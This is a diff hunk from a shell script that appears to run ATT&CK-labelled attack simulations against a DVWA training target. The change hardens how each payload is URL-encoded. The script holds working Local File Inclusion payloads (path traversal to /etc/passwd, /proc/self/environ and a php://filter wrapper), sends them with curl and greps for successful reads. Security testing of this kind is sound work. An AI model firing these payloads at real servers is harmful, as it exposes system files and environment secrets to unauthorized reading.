@@ -15,7 +15,7 @@ echo "=== T1005: Data from Local System (via LFI) ==="
 echo "    Technique: Read sensitive files via Local File Inclusion"
 LFI_FILES=("../../../etc/passwd" "../../../etc/hosts" "../../../proc/self/environ" "php://filter/convert.base64-encode/resource=../../../etc/passwd")
 for f in "${LFI_FILES[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${f}'))" 2>/dev/null)
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${f}" 2>/dev/null)
   resp=$(curl -sf "${BASE}/dvwa/vulnerabilities/fi/?page=${encoded}" --max-time 10 2>/dev/null)
   if echo "$resp" | grep -qE "(root:|localhost|HOME=)" 2>/dev/null; then
     echo "  [VULN] T1005 File read: ${f}"
